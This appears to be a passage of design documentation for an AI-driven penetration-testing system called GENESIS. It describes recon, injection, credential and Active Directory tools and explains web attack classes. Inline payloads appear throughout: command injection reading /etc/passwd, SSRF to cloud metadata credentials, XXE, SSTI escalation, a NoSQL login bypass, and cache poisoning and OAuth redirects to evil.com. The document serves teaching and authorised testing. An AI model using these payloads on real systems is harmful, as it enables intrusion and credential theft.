#### `whatweb` — Web Technology Identifier
**What it is:** Fingerprints websites to identify the technology stack.

**What it finds:** CMS (WordPress, Drupal, Joomla), programming language (PHP, Python, Ruby), web framework (Laravel, Django, Rails), JavaScript libraries, server software (Apache, Nginx, IIS), analytics tools, and hundreds of other signatures.

**Why it matters for GENESIS:** Knowing the stack tells Claude which tools to use next. WordPress → wpscan. PHP → look for command injection. Old jQuery → look for prototype pollution. This technology fingerprinting guides the entire subsequent assessment strategy.

---

#### `wafw00f` — WAF Detector
**What it is:** Web Application Firewall detector.

**What it does:** Sends carefully crafted HTTP requests (normal, malformed, known attack patterns) and analyzes the responses to determine if a WAF is present and which one (Cloudflare, AWS WAF, ModSecurity, Akamai, F5, etc.).

**Why it matters:** If a WAF is detected, GENESIS switches to WAF-bypass payload variants (encoding tricks, fragmentation, case manipulation) rather than sending raw attack strings that would be blocked.

---

#### `gobuster` — Directory and File Brute-Forcer
**What it is:** A fast tool for discovering hidden web paths.

**What it does:** Sends HTTP requests for each word in a wordlist (e.g. `/admin`, `/backup`, `/config`, `/api`, `/private`) and records which ones return a valid response.

**What it finds:** Hidden admin panels, backup files (`.bak`, `.old`, `.zip`), configuration files (`config.php`, `.env`), source code accidentally left on the server, old application versions, development environments (`/staging/`, `/dev/`).

---

#### `feroxbuster` — Recursive Directory Brute-Forcer
**What it is:** A Rust-based directory fuzzer that recursively crawls found directories.

**Difference from gobuster:** Feroxbuster discovers `/api/` and immediately also checks `/api/v1/`, `/api/v2/`, `/api/users/`, etc. — it goes deeper automatically. Better for discovering deep API structures.

---

#### `ffuf` — Fast Web Fuzzer
**What it is:** The most flexible web fuzzing tool — can fuzz any part of an HTTP request.

**What it does:** Replaces a `FUZZ` placeholder anywhere in a request (URL, POST body, headers, cookies) with values from a wordlist.

**Use cases in GENESIS:**
- `http://target.com/api/FUZZ` — find API endpoints
- `http://target.com/users/FUZZ` — enumerate user IDs
- `http://target.com/login` with body `username=FUZZ&password=test` — username enumeration
- Headers: `X-Custom-Header: FUZZ` — discover header injection points

---

#### `wpscan` — WordPress Scanner
**What it is:** A scanner specifically designed for WordPress sites.

**What it does:** Enumerates WordPress version, installed plugins, themes, user accounts (via REST API), and checks all of these against a database of known vulnerabilities.

**Why dedicated?** WordPress powers ~40% of all websites. Its plugin ecosystem has thousands of third-party plugins with varying security quality. A core WordPress site might be secure, but one vulnerable plugin breaks everything. WPScan knows about all of them.

**What it finds:** Vulnerable plugins (e.g. Elementor SQLi, WooCommerce privilege escalation), user account enumeration (allows targeted brute-force), outdated WordPress core, misconfigured file permissions.

---

#### `xsstrike` — XSS Testing Tool
**What it is:** An advanced Cross-Site Scripting (XSS) detection and exploitation tool.

**What is XSS?** XSS is a vulnerability where an attacker can inject JavaScript code into a web page that other users see. The injected code runs in the victim's browser — allowing session theft, credential harvesting, or defacement.

**What xsstrike does:** Crawls the application, identifies input fields, generates sophisticated payloads designed to bypass filters, and tests each one. Unlike simple scanners that try `<script>alert(1)</script>`, xsstrike generates context-aware payloads based on where the input is reflected in the page.

---

#### `sqlmap` — SQL Injection Tool
**What it is:** The most powerful SQL injection detection and exploitation tool.

**What is SQL injection?** SQL injection is a vulnerability where user input is inserted into a database query without sanitization. An attacker can modify the query to retrieve unauthorized data, bypass authentication, or in some cases execute system commands.

**What sqlmap does:** Tests hundreds of injection techniques across multiple database engines (MySQL, PostgreSQL, MSSQL, Oracle, SQLite). It detects boolean-based blind, error-based, time-based blind, UNION-based, and stacked query injections.

**GENESIS uses it:** In safe mode (no --risk 3, no --os-shell). The goal is to confirm the injection exists and extract table structure — not to dump entire databases or execute commands.

---

#### `commix` — Command Injection Tool
**What is command injection?** When user input is passed to a system shell command without sanitization. Example: `system("ping " + user_input)`. An attacker sends `; cat /etc/passwd` as input, causing the server to execute `ping ; cat /etc/passwd` — exposing the password file.

**What commix does:** Tests all injection techniques (classic, time-based blind, file-based) across GET/POST parameters, cookies, HTTP headers, and user-agent strings.

---

#### `arjun` — HTTP Parameter Discoverer
**What it is:** Discovers hidden GET/POST parameters in web applications.

**Why it matters:** Web applications often accept parameters that are not visible in forms or documentation. Hidden parameters might control admin access (`?admin=true`), toggle debug mode (`?debug=1`), or bypass rate limiting. Arjun finds these by sending thousands of test parameters and observing behavioral changes.

---

### Category 3: SSL/TLS Analysis (2 Tools)

---

#### `sslscan` — SSL/TLS Comprehensive Analyzer
**What it is:** Tests every aspect of an SSL/TLS configuration.

**What it checks:**
- Supported protocol versions (SSLv2, SSLv3, TLS 1.0, 1.1, 1.2, 1.3) — old versions have known vulnerabilities
- Supported cipher suites — weak ciphers (RC4, DES, 3DES) allow decryption
- Certificate validity, expiration, and chain
- Known attacks: Heartbleed (memory disclosure), BEAST, POODLE, DROWN, CRIME, LOGJAM

**What GENESIS finds:** Expired certificates, weak cipher suites, protocol downgrade attacks, Heartbleed vulnerability (CVE-2014-0160 — allows reading 64KB of server memory), POODLE (SSLv3 vulnerability allowing session decryption).

---

#### `openssl_check` — Certificate Inspector
**What it is:** Uses the OpenSSL CLI to inspect TLS certificates and perform test connections.

**What it checks:** Certificate subject, issuer, validity period, Subject Alternative Names (SANs — all domains the cert is valid for), key size, signature algorithm, and whether the certificate is trusted by the system's CA bundle.

---

### Category 4: Authentication & Credentials (2 Tools)

---

#### `hydra` — Network Service Brute-Forcer
**What it is:** The most widely used credential brute-forcing tool for network services.

**What it does:** Tests username/password combinations against: SSH, FTP, HTTP login forms, SMTP, LDAP, MySQL, PostgreSQL, RDP, SMB, VNC, and many more.

**What GENESIS uses it for:** After discovering a login service, Claude may decide to attempt common/default credential lists. This is targeted — not random — based on what was discovered (e.g. if nikto found `admin/admin` is a common default for this specific software version).

**Limitations in GENESIS:** Always rate-limited and targeted. Never runs dictionary attacks larger than a few hundred common passwords — GENESIS is looking for low-hanging fruit (default credentials), not conducting exhaustive brute-force.

---

#### `john` — Password Hash Cracker
**What it is:** John the Ripper — the classic password cracking tool.

**What it does:** Takes password hashes (MD5, bcrypt, SHA-1, NT hashes, and many others) and attempts to recover the plaintext password using wordlists, mangling rules, and brute-force.

**When GENESIS uses it:** If sqlmap or file access reveals password hashes from a database or `/etc/shadow`, john attempts to crack them offline.

---

### Category 5: Windows / Active Directory (4 Tools)

Active Directory (AD) is Microsoft's directory service used in corporate networks. AD attacks are a crucial category for internal network assessments.

---

#### `enum4linux` — Windows/SMB Enumerator
**What it is:** Extracts information from Windows/Samba systems without authentication.

**What it finds:** Domain/workgroup name, list of users, list of shares, password policies (minimum length, lockout threshold), OS version, printer information.

**Why unauthenticated enumeration matters:** Many Windows systems allow null sessions (anonymous connections) that expose user lists. Knowing usernames allows targeted attacks without guessing.

---

#### `netexec` (formerly CrackMapExec) — Network Execution Framework
**What it is:** A Swiss Army knife for post-exploitation and lateral movement in Windows networks.

**What it does:** Tests credentials against SMB, WinRM, LDAP, RDP, and SSH. Can execute commands on authenticated systems, dump SAM hashes, retrieve LAPS passwords, spray credentials across a network.

**What GENESIS uses it for:** Credential validation (are these credentials valid on other systems?), lateral movement simulation, finding systems running vulnerable services, checking for password reuse across accounts.

---

#### `impacket` — Python AD Attack Suite
**What it is:** A collection of Python scripts implementing various Active Directory attack techniques.

**Modules GENESIS uses:**
- `secretsdump`: Dumps credential hashes from domain controllers, local SAM databases, and LSA secrets
- `GetUserSPNs`: Finds Kerberoastable service accounts (services with SPNs registered)
- `GetNPUsers`: Finds AS-REP roastable accounts (accounts with Kerberos pre-authentication disabled)
- `lookupsid`: Enumerates users and groups by SID
- `wmiexec`: Executes commands via Windows Management Instrumentation

---

#### `kerbrute` — Kerberos Attack Tool
**What it is:** Fast Kerberos-based user enumeration and password attack tool.

**What is Kerberos?** The authentication protocol used in Active Directory. When a user logs in, Kerberos issues "tickets" (encrypted tokens) that grant access to services.

**What kerbrute does:**
- **User enumeration**: Tests usernames against Kerberos without generating failed login events (invisible to many security monitoring tools)
- **Password spray**: Tests a single common password against many accounts (avoids account lockout)
- **Brute-force**: Tests many passwords against one account (triggers lockout — GENESIS avoids this mode)

---

### Category 6: Static Code Analysis (2 Tools)

Static analysis examines source code without executing it.

---

#### `semgrep` — Semantic Code Pattern Matcher
**What it is:** A static analysis tool that finds bugs and security issues by matching code patterns across 30+ languages.

**What GENESIS uses it for:** When source code is accessible (via file disclosure, git exposure, or direct access in a white-box assessment). Semgrep has curated security rulesets that find: SQL injection in ORM usage, hardcoded secrets, insecure cryptography, path traversal, SSRF, XSS sinks, and more.

**Example rule concept:** Find all places where user input flows into a `subprocess.run()` call without sanitization → potential command injection.

---

#### `bandit` — Python Security Linter
**What it is:** A security-focused static analyzer for Python code.

**What it finds:** Use of MD5/SHA1 for passwords, hardcoded passwords, SQL query construction via string formatting, use of `eval()` or `exec()`, subprocess calls with shell=True, insecure XML parsing, use of random instead of secrets for security-sensitive operations.

---

### Category 7: Intelligence Tools (3 Tools)

These are GENESIS-native tools, not pre-existing binaries.

---

#### `payload_crafter` — Context-Aware Payload Generator
**What it is:** A GENESIS-native tool that generates attack payloads customized for a specific technology stack and injection context.

**What it does:** Given a vulnerability type (`sqli`, `xss`, `cmdi`, `lfi`, `ssrf`, `ssti`, `xxe`) and technology stack (`php`, `java`, `python`, `node`), generates multiple payload variants including WAF bypass encodings.

**Example:** `vuln_type=xss, tech_stack=php, context=html_attribute, encoding=html_entity` generates payloads like `&#x27;onmouseover=alert(1)//` designed to work when reflected inside an HTML attribute with HTML entity decoding.

---

#### `binary_analyzer` — Binary Inspection Tool
**What it is:** Analyzes compiled binaries for security-relevant information.

**What it does:** Extracts strings (hardcoded credentials, URLs, file paths), symbol names (function names that reveal functionality), binary headers (architecture, linked libraries), and patterns suggesting security issues.

**What GENESIS uses it for:** If a file download or accessible file path reveals a binary, analyzing it for hardcoded API keys, internal URLs, or debug symbols that reveal application structure.

---

#### `code_pattern_search` — Deep Code Pattern Scanner
**What it is:** A grep-based deep search across source code trees.

**Pattern sets it uses:**
- **secrets**: API keys, JWT secrets, AWS keys, database passwords in source code
- **injections**: SQL concatenation, command execution, eval() calls, file inclusion patterns
- **auth_bypass**: Hardcoded admin checks, commented-out authentication, debug mode flags
- **crypto_weak**: MD5 password hashing, DES, ECB mode, Math.random() for tokens
- **all**: All of the above

---

### Category 8: Novel Vulnerability Discovery (4 Tools)

These 4 tools are unique to GENESIS — they implement detection techniques that traditional scanners cannot perform because they require reasoning about when and why to use them.

---

#### `oob_check` — Out-of-Band Callback Server
**Full explanation:** See Section 11.1 below.

---

#### `differential_probe` — Behavioral Comparison Matrix
**Full explanation:** See Section 11.2 below.

---

#### `race_probe` — Concurrent Request Race Detector
**Full explanation:** See Section 11.3 below.

---

#### `session_memory` — Cross-Endpoint Working Memory
**Full explanation:** See Section 11.4 below.

---

### Category 9: HTTP Vulnerability Analysis (10 Tools)

These 10 tools are pure-TypeScript GENESIS-native tools covering advanced HTTP attack classes that no traditional scanner covers. They require zero external binaries and are available from day one. Full algorithmic explanations are in Section 11.

---

#### `idor_probe` — IDOR / BOLA Detector
**What it is:** Enumerates sequential integer or UUID object IDs with one auth token, then cross-validates interesting IDs with a second token to confirm unauthorized access.

**What it finds:** IDOR (Insecure Direct Object Reference) and BOLA (Broken Object Level Authorization) — the #1 vulnerability class in the OWASP API Security Top 10. Detects when a user can access another user's resources simply by changing an ID in the URL.

**Example:** URL template `/api/users/{id}` — sweeps IDs 1–50 with attacker token, then re-requests IDs that returned 200 with a victim token. If attacker=200 and victim=403, the app enforces auth correctly. If both return 200, IDOR is confirmed.

**MITRE:** T1078 (Valid Accounts — horizontal privilege escalation)

---

#### `cors_probe` — CORS Misconfiguration Tester
**What it is:** Sends 8 crafted Origin headers to a target URL and analyzes the `Access-Control-Allow-Origin` (ACAO) and `Access-Control-Allow-Credentials` (ACAC) response headers.

**What it finds:** CORS misconfigurations that allow attacker-controlled origins to read credentialed responses — equivalent in impact to stored XSS. A reflected ACAO + `ACAC: true` means any website the victim visits can silently read their private API data.

**Probe origins tested:** `null`, `https://attacker.com`, `https://evil.<target-domain>`, `https://<target-host>.evil.com`, HTTP downgrade, prefix/suffix spoofing, empty string.

**MITRE:** T1059.007 (JavaScript)

---

#### `jwt_probe` — JWT Attack Suite
**What it is:** Attacks JSON Web Tokens using five techniques: alg:none bypass (4 case variants), blank secret, 15 common secrets brute-forced in-memory via HMAC, RS256→HS256 algorithm confusion, and `kid` header injection.

**What it finds:** JWT authentication bypasses that allow forging arbitrary tokens to impersonate any user including admins. The `alg:none` attack requires no key material — just change the header, strip the signature, and send.

**Technical note:** All HMAC brute-force comparisons run in memory using `node:crypto.createHmac`. Only one HTTP request is made when a matching secret is found — not one per candidate.

**MITRE:** T1552.001 (Credentials in Files — token forgery)

---

#### `graphql_probe` — GraphQL Security Tester
**What it is:** Tests GraphQL endpoints for six vulnerability classes: introspection enabled (schema leakage), field suggestion leakage, batching for rate-limit bypass, deep nesting DoS, GET-based CSRF, and sensitive mutation discovery.

**What it finds:** GraphQL APIs that expose their full schema (introspection) allow an attacker to enumerate every query, mutation, type, and field — effectively getting the API documentation they were never meant to see. Enabled batching allows bypassing rate limits by packing 100 queries into one request.

**Endpoints targeted:** `/graphql`, `/api/graphql`, `/v1/graphql`, `/query` (any path ending in `graphql`).

**MITRE:** T1083 (File and Directory Discovery)

---

#### `ssti_detect` — Server-Side Template Injection Detector
**What it is:** Sends 10 math-expression probes covering Jinja2, Twig, FreeMarker, ERB, SpEL, Tornado, and Razor template engines. Fingerprints the engine based on which expression evaluates and confirms the RCE pathway via MRO chain probe.

**What it finds:** SSTI vulnerabilities where user input is rendered inside a template engine, allowing expression evaluation. Detection confirms the path to Remote Code Execution without executing any system commands.

**Probe examples:** `{{7*7}}→49` (Jinja2/Twig), `${7*7}→49` (SpEL/FreeMarker), `<%= 7*7 %>→49` (ERB/EJS), `#{7*7}→49` (Thymeleaf), `@(7*7)→49` (Razor).

**CVSS:** 9.0–10.0 (SSTI = RCE)  **MITRE:** T1190

---

#### `nosql_probe` — NoSQL Injection Tester
**What it is:** Tests MongoDB injection using `$ne`, `$gt`, `$regex`, `$where`, and `$nin` operators via both JSON body (for APIs) and bracket-notation query parameters. Includes boolean blind detection via response length comparison.

**What it finds:** NoSQL injection vulnerabilities where MongoDB query operators in user input bypass authentication or extract unauthorized data. A `username[$ne]=x&password[$ne]=x` attack logs in as the first matching user in the database with zero credentials.

**Boolean blind detection:** True payload (`$ne: "invalid_xyz_31337"`) vs false payload (`$ne: ""`) — if response length delta exceeds 30 bytes, injection is confirmed even without error messages.

**MITRE:** T1190

---

#### `cache_probe` — Cache Poisoning / Cache Deception Tester
**What it is:** Tests six cache attack vectors: `X-Forwarded-Host` reflection in body/headers, `X-Original-URL`/`X-Rewrite-URL` path override, IP-bypass via `X-Forwarded-For: 127.0.0.1`, static-extension cache deception, fat GET body poisoning, and cache header analysis.

**What it finds:** Cache poisoning vulnerabilities where an attacker can poison a CDN or reverse proxy cache to serve a malicious response to all subsequent users. Cache deception vulnerabilities where sensitive authenticated pages are tricked into being cached publicly.

**Cache buster:** Uses `node:crypto.randomBytes` to generate a unique `?__cb=` parameter per request, ensuring tests bypass any existing cache.

**MITRE:** T1557 (Adversary-in-the-Middle)

---

#### `prototype_pollution_probe` — JavaScript Prototype Pollution Tester
**What it is:** Injects `__proto__` and `constructor.prototype` payloads via POST body and query string parameters, then uses a canary request to detect server-side state mutation.

**What it finds:** Prototype pollution in Node.js/Express APIs where merging user-supplied JSON into an application object pollutes `Object.prototype`, potentially enabling privilege escalation (setting `isAdmin: true` on all objects), property injection, or denial of service.

**Canary detection:** After each pollution payload, a clean baseline request is sent. If the clean request's response size or status differs from the pre-pollution baseline by more than 50 bytes, server-side state mutation is confirmed.

**MITRE:** T1190

---

#### `oauth_probe` — OAuth 2.0 / OIDC Security Tester
**What it is:** Tests OAuth flows for `redirect_uri` bypass (8 variants), state parameter omission (CSRF), and PKCE downgrade. Uses manual redirect following (`redirect: 'manual'`) to inspect each hop in the authorization flow.

**What it finds:** `redirect_uri` bypass allowing an attacker to steal authorization codes by registering a URL that the authorization server mistakenly accepts (path traversal, fragment injection, subdomain spoofing, suffix matching, scheme change). State omission enabling CSRF attacks against OAuth flows.

**Bypass variants tested:** `{redir}/..`, `{redir}?x=1`, `{redir}#@evil.com`, `{redir}%23@evil.com`, `evil.{registrable-domain}`, `{redir}.evil.com`, `//evil.com`, `http://evil.com`.

**MITRE:** T1550.001 (Use Alternate Authentication Material)

---

#### `http_smuggling_probe` — HTTP Request Smuggling Detector
**What it is:** Tests CL.TE, TE.CL, and TE.TE obfuscation variants using raw TCP sockets via `node:net` and `node:tls` — bypassing Node.js HTTP header normalization that would strip ambiguous headers before sending.

**What it finds:** HTTP request smuggling vulnerabilities in the interface between a front-end reverse proxy and a back-end server that disagree about where one HTTP request ends and the next begins. Can lead to request hijacking, cache poisoning, and WAF bypass.

**Detection method:** Timing differential — a desync probe that hangs waiting for data that never arrives takes significantly longer than a clean baseline request. Time > 4× baseline + timeout → `desync_likely`. Connection reset or 400 → `hardened`.

**Why raw sockets?** Node.js's `http.request()` normalizes headers and would automatically resolve the CL/TE conflict before the packet leaves. Only raw TCP allows sending genuinely ambiguous requests.

**MITRE:** T1071.001 (Web Protocols)

---

## 10. Attack Types — Plain English Explanations

This section explains every major vulnerability class that GENESIS can detect, with plain-English definitions and real examples.

### 10.1 SQL Injection (SQLi)

**What it is:** The server builds a database query by concatenating user input directly into the query string. The attacker injects SQL code that changes the meaning of the query.

**Real example:**
```
Normal login query:
SELECT * FROM users WHERE username = 'alice' AND password = 'secret'

Attacker enters username:  alice' OR '1'='1
The query becomes:
SELECT * FROM users WHERE username = 'alice' OR '1'='1' AND password = ''
'1'='1' is always true → the attacker is logged in as alice
```

**GENESIS detection:** sqlmap tests hundreds of injection points. For blind injection (no visible error), differential_probe compares responses to identical vs. attack inputs to detect behavioral differences.

**CVSS range:** 7.5–9.8 (High to Critical)

**MITRE:** T1190 (Exploit Public-Facing Application)

---

### 10.2 Cross-Site Scripting (XSS)

**What it is:** The attacker injects JavaScript code into a web page that is then displayed to other users. The injected script runs in the victim's browser.

**Three types:**
- **Reflected XSS**: The payload is in the URL. The victim must click a malicious link.
- **Stored XSS**: The payload is saved to the database and shown to all users of that page. More dangerous.
- **DOM XSS**: The client-side JavaScript itself inserts attacker-controlled input into the page without it ever reaching the server.

**Real impact:** Steal session cookies (account takeover), redirect to phishing pages, keylog passwords, perform actions on behalf of the victim.

**CVSS range:** 4.3–8.8 (Medium to High)

---

### 10.3 Command Injection (CMDi)

**What it is:** User input is passed to a system shell command without sanitization. The attacker injects shell metacharacters to run their own commands.

**Example:**
```
Application: system("ping " + userInput)
Attacker input: 127.0.0.1; cat /etc/passwd
Command executed: ping 127.0.0.1; cat /etc/passwd
```

**GENESIS detection:** commix tests all parameters. For blind injection (no output), oob_check detects if the server makes a DNS/HTTP request to a callback URL injected into the parameter.

**CVSS range:** 9.0–10.0 (Critical — often leads to full system compromise)

---

### 10.4 Server-Side Request Forgery (SSRF)

**What it is:** The server is tricked into making HTTP requests on behalf of the attacker. The attacker uses the server as a proxy to reach internal systems that are not directly accessible.

**Example:**
```
Application has an "import from URL" feature: POST /import?url=https://example.com
Attacker sends: POST /import?url=http://169.254.169.254/latest/meta-data/iam/credentials
The server fetches the AWS metadata endpoint → returns IAM credentials
```

**Blind SSRF:** The server makes the request but does not return the response to the attacker. GENESIS uses oob_check to detect this — the server makes a request to the callback URL, confirming the vulnerability.

**CVSS range:** 5.0–9.8 (Medium to Critical, depending on what internal systems are reachable)

**MITRE:** T1090 (Proxy)

---

### 10.5 XML External Entity (XXE)

**What it is:** Applications that parse XML input can be tricked into reading local files or making network requests via XML entities.

**Example:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

The `&xxe;` entity is replaced with the contents of `/etc/passwd`. If the application reflects this data back, the attacker reads the file.

**Blind XXE:** The response does not contain the file contents, but the server made an outbound request to resolve the entity. oob_check detects this via DNS callback.

---

### 10.6 Local File Inclusion (LFI)

**What it is:** The application includes files from the local filesystem based on user-supplied input, without validation.

**Example:**
```
URL: http://target.com/page.php?file=about
Code: include($_GET['file'] . '.php');

Attacker sends: ?file=../../../../etc/passwd%00
With null byte injection: ../../../../etc/passwd (drops the .php suffix)
```

**What can be read:** `/etc/passwd` (user list), `/etc/shadow` (password hashes), application configuration files (database credentials), private SSH keys, web server logs (then use log poisoning to get code execution).

---

### 10.7 Path Traversal (Directory Traversal)

**Similar to LFI** but in the context of file downloads or static file serving. `../../../../etc/passwd` in a file download URL allows reading any file the web server has access to.

**Famous real example:** CVE-2021-41773 in Apache 2.4.49 — `GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` exploited a URL normalization bug.

---

### 10.8 Server-Side Template Injection (SSTI)

**What it is:** Web applications often use template engines (Jinja2, Twig, Thymeleaf, Handlebars) to generate dynamic HTML. If user input is passed directly into a template that is then rendered, the attacker can inject template expressions that execute code.

**Example (Jinja2):**
```
Normal: Hello {{ name }}
Attacker input as name: {{ 7*7 }}
Response: Hello 49  ← template engine evaluated the expression

Attacker escalates: {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
→ reads /etc/passwd via Python's file handling internals
```

**CVSS:** 9.0–10.0 (Critical — SSTI typically leads to RCE)

---

### 10.9 Insecure Direct Object Reference (IDOR)

**What it is:** The application exposes internal object identifiers (database IDs, filenames, user IDs) in URLs or parameters, and does not check if the requesting user has permission to access that object.

**Example:**
```
User Alice is logged in. Her profile URL is: /api/users/1042
Alice notices the ID is sequential. She requests: /api/users/1041
The server returns Bob's profile data — she is not authorized to see this.
```

**GENESIS detection:** session_memory stores discovered user IDs and endpoints. Claude cross-references them and uses differential_probe to test whether authentication is properly enforced per object.

**CVSS range:** 4.3–7.5 (Medium to High)

---

### 10.10 Race Condition / TOCTOU

**What it is:** Two or more operations that should be atomic (happen as a single unit) are instead separate steps. An attacker can exploit the gap between the "check" and the "act."

**TOCTOU** = Time-Of-Check/Time-Of-Use

**Example:**
```
Balance check:    "Does user have ≥ $10?"  → Yes (at time T)
Balance deduction: "Deduct $10 from user"  → happens at time T+1ms

If two requests arrive simultaneously at T, both checks see "yes"
Both deductions execute → user spent $10 but got $20 of value
```

**GENESIS detection:** race_probe sends 10–50 concurrent requests simultaneously using `Promise.all`. If multiple succeed where only one should, the race condition is confirmed.

---

### 10.11 Kerberoasting

**What it is:** An Active Directory attack that extracts Kerberos service tickets and cracks them offline.

**How it works:** Service accounts in AD have SPNs (Service Principal Names). Any authenticated domain user can request a Kerberos service ticket for any SPN. The ticket is encrypted with the service account's password hash. The attacker requests these tickets, captures them, and uses john or hashcat to crack the passwords offline — without any interaction with the domain controller after the initial ticket request.

**Why it works:** Service accounts often have weak or never-expiring passwords set years ago. The attack generates no failed login events.

---

### 10.12 AS-REP Roasting

**What it is:** Similar to Kerberoasting but targets accounts with "Do not require Kerberos preauthentication" enabled.

**How it works:** Normally, a Kerberos pre-authentication request requires proving knowledge of the user's password. If pre-auth is disabled, anyone can request a TGT (Ticket Granting Ticket) for that user. The TGT is encrypted with the user's password hash and can be cracked offline.

---

### 10.13 Privilege Escalation

**What it is:** Starting with limited access (e.g. a low-privilege user account) and gaining higher-level access (e.g. administrator or root).

**Categories:**
- **Vertical privilege escalation**: Low-privilege user → admin
- **Horizontal privilege escalation**: User A accessing User B's data (also IDOR)

**Common methods:** Misconfigured sudo rules, SUID binaries, writable service files, kernel exploits, credential reuse, token impersonation (Windows).

---

### 10.14 Credential Stuffing / Password Spray

**Credential stuffing:** Using username/password pairs from previous data breaches to attempt login on a different service (relies on password reuse).

**Password spray:** Testing one common password (e.g. `Summer2024!`) against many accounts. Avoids lockout policies that trigger after N failed attempts on a single account.

**GENESIS approach:** hydra for password spray (with configurable delay), john for offline hash cracking.

---

### 10.15 Broken Authentication

**What it is:** Authentication mechanisms that can be bypassed or weakened:
- Session tokens that are predictable (sequential, low entropy)
- Session tokens that do not expire after logout
- JWT tokens with `alg: none` (no signature validation)
- Weak password reset flows (guessable tokens, no expiry)
- Multi-factor authentication bypass (race condition in OTP validation)

**GENESIS detection:** curl_probe examines session token entropy, JWT header inspection, and tests for common auth bypass techniques. jwt_probe explicitly tests alg:none, blank secret, and common secrets — the three most common JWT implementation flaws.

---

### 10.16 CORS Misconfiguration

**What it is:** The server's Cross-Origin Resource Sharing policy allows attacker-controlled origins to read credentialed responses.

**How browsers enforce CORS:** A browser script at `evil.com` cannot read a response from `bank.com` unless `bank.com` explicitly grants permission via `Access-Control-Allow-Origin: https://evil.com`. If the server reflects whatever Origin header it receives, any malicious website can silently read the victim's bank data in the background.

**Critical combination:** `Access-Control-Allow-Origin: <reflected>` + `Access-Control-Allow-Credentials: true` = any authenticated data the victim's browser can reach is now readable by `evil.com`.

**Real attack:** Victim visits `evil.com`. JavaScript on `evil.com` makes an XMLHttpRequest to `bank.com/api/account`. Bank.com reflects the origin and allows credentials → evil.com receives and exfiltrates the full account response.

**CVSS range:** 5.3–8.8 (Medium to High)

---

### 10.17 JWT Attacks

**What is a JWT?** JSON Web Token — a base64url-encoded, signed token used for stateless authentication. Structure: `header.payload.signature`. The header specifies the algorithm, the payload contains claims (user ID, role, expiry), and the signature prevents tampering.

**alg:none attack:** The JWT specification allows `"alg": "none"`, meaning no signature is required. Many libraries implement this and accept unsigned tokens without warning. An attacker strips the signature and changes any payload claim (e.g. `"role": "admin"`).

**Blank/common secret attack:** HMAC-signed JWTs use a shared secret. If the secret is blank, `""`, `"secret"`, `"password"`, or any other common value, it can be brute-forced locally in milliseconds — no server interaction required until a match is found.

**RS256→HS256 confusion:** A server configured for RS256 (public/private key) may accept an HS256 token where the signing key is the public key (which is publicly available). The server verifies it as a valid HMAC signature.

**CVSS range:** 7.5–9.8 (High to Critical)

---

### 10.18 GraphQL Security Issues

**What is GraphQL?** An API query language and runtime. Unlike REST (which has one endpoint per resource), GraphQL has a single endpoint that accepts structured queries. The schema defines all available types, queries, and mutations.

**Introspection enabled:** GraphQL's introspection feature allows clients to query the schema itself (`{__schema{types{name}}}`) — getting the complete API documentation. This should be disabled in production. If enabled, an attacker learns every query, mutation, type, and field — including admin-only ones that aren't linked in the UI.

**Batching bypass:** GraphQL allows multiple queries in one HTTP request (batching). A rate limiter counting HTTP requests instead of GraphQL operations can be bypassed by sending 100 queries in one request.

**Deep nesting DoS:** A query like `{users{posts{comments{likes{user{posts{...}}}}}}}` can be 20+ levels deep. Without depth limiting, this creates exponential database queries and crashes the server.

**CVSS range:** 5.3–9.8 depending on what is exposed through introspection

---

### 10.19 NoSQL Injection

**What it is:** MongoDB and other NoSQL databases use operator-based queries rather than SQL syntax. If user input is directly inserted into a query object without sanitization, operators in that input change the query logic.

**Example (MongoDB login bypass):**
```javascript
// Vulnerable code:
db.users.findOne({ username: req.body.username, password: req.body.password })

// Attacker sends: { "username": {"$ne": null}, "password": {"$ne": null} }
// Query becomes: findOne({ username: {$ne: null}, password: {$ne: null} })
// Returns the first user in the database — authentication bypassed with no credentials
```

**Boolean blind detection:** `$ne: "invalid_xyz_31337"` returns a match (true condition), while `$ne: ""` returns no match (false condition, because the empty string matches real passwords). Response length difference confirms injection.

**CVSS range:** 7.5–9.8 (High to Critical — auth bypass = full account compromise)

---

### 10.20 Cache Poisoning / Web Cache Deception

**Cache poisoning:** An attacker manipulates HTTP headers to cause a cache (CDN, reverse proxy) to store and serve a malicious response to all subsequent users requesting the same resource.

**Classic attack:**
```
Attacker sends:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

Response body contains: <script src="https://evil.com/malicious.js">
Cache stores this response and serves it to every subsequent visitor.
→ Site-wide stored XSS affecting all users
```

**Web cache deception:** The attacker tricks the server into caching a sensitive authenticated page by appending a static extension:
```
Victim visits: https://bank.com/account/statement.css
Server: returns actual account statement (ignores .css suffix)
Cache: stores it (because .css files are cached)
Attacker fetches the same URL: receives cached account statement
```

**CVSS range:** 7.5–9.0 (High)

---

### 10.21 Prototype Pollution

**What it is:** In JavaScript, every object inherits properties from `Object.prototype`. If user-supplied JSON is merged into an application object without sanitizing special keys, an attacker can add properties to `Object.prototype` that then appear on every object in the application.

**Example:**
```javascript
// Vulnerable deep merge:
function merge(target, source) {
  for (let key of Object.keys(source)) {
    if (typeof source[key] === 'object') merge(target[key], source[key]);
    else target[key] = source[key];
  }
}

// Attacker sends: {"__proto__": {"isAdmin": true}}
// merge({}, {__proto__: {isAdmin: true}}) pollutes Object.prototype
// Now: ({}).isAdmin === true for every object in the process
```

**Impact:** Privilege escalation (all users become admin), property injection into security checks, denial of service (crash via undefined.property access).

**CVSS range:** 5.3–9.8 depending on what properties are polluted

---

### 10.22 OAuth / OIDC Bypass

**OAuth 2.0:** An authorization framework allowing users to grant third-party apps access to their data without sharing passwords. The `redirect_uri` parameter specifies where the authorization code is sent after the user consents.

**redirect_uri bypass:** The authorization server should only redirect to pre-registered URIs. Implementation bugs allow bypass via:
- Path traversal: `https://app.com/callback/../evil`
- Subdomain: `https://evil.app.com/callback` accepted as `app.com` variant
- Suffix match: `https://app.com.evil.com` accepted if check only verifies suffix
- Fragment: `https://app.com/callback#@evil.com` — browser sends token to evil.com
- Scheme change: `http://app.com/callback` accepted when `https://` is registered

**Stolen code impact:** The authorization code allows the attacker to exchange it for access tokens at the token endpoint → full account takeover.

**CVSS range:** 8.0–9.8 (High to Critical)

---

### 10.23 HTTP Request Smuggling

